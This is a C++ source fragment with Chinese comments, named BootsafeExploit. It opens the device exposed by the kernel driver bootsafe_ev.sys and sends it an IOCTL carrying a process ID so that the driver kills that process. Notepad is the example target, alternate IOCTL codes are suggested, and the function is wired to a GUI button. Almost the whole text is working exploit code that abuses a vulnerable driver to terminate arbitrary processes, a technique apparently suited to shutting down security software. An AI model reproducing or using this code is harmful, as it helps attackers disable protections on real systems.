// BootsafeExploit.h / .cpp 片段

#include <windows.h>
#include <winioctl.h>
#include <tlhelp32.h>
#include <stdio.h>

#define DEVICE_PATH_BOOTSAFE L"\\\\.\\kguard"
#define IOCTL_KILL_BOOTSAFE  0x222030

// 辅助函数：获取进程 ID
DWORD GetProcessIdByName(const wchar_t* processName) {
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe = { sizeof(PROCESSENTRY32W) };
    if (Process32FirstW(snapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, processName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snapshot, &pe));
    }
    CloseHandle(snapshot);
    return pid;
}

// 针对 bootsafe_ev.sys 的利用函数
bool ExploitBootsafeKillProcess() {
    // 1. 打开驱动设备
    HANDLE hDevice = CreateFileW(DEVICE_PATH_BOOTSAFE,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, 0, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        wprintf(L"[!] 打开设备 %s 失败，错误码 %d\n", DEVICE_PATH_BOOTSAFE, GetLastError());
        return false;
    }

    // 2. 获取目标进程 PID（以记事本为例）
    DWORD pid = GetProcessIdByName(L"notepad.exe");
    if (pid == 0) {
        wprintf(L"[!] 未找到 notepad.exe，请先启动记事本。\n");
        CloseHandle(hDevice);
        return false;
    }

    // 3. 发送 IOCTL
    DWORD bytesReturned = 0;
    BOOL bResult = DeviceIoControl(hDevice, IOCTL_KILL_BOOTSAFE,
        &pid, sizeof(pid),        // 输入：PID
        NULL, 0,                  // 无输出
        &bytesReturned, NULL);

    DWORD lastError = GetLastError();
    CloseHandle(hDevice);

    if (bResult) {
        wprintf(L"[+] bootsafe_ev.sys: IOCTL 0x%08X 发送成功，进程已终止。\n", IOCTL_KILL_BOOTSAFE);
        return true;
    } else {
        wprintf(L"[-] bootsafe_ev.sys: IOCTL 失败，错误码 %d\n", lastError);
        // 若失败，可尝试备用码（可选）
        // 如 0x222020, 0x222038
        return false;
    }
}

// MFC 按钮事件（例如 IDC_BTN_BOOTSAFE）
void CYourDlg::OnBnClickedBtnBootsafe() {
    ExploitBootsafeKillProcess();
}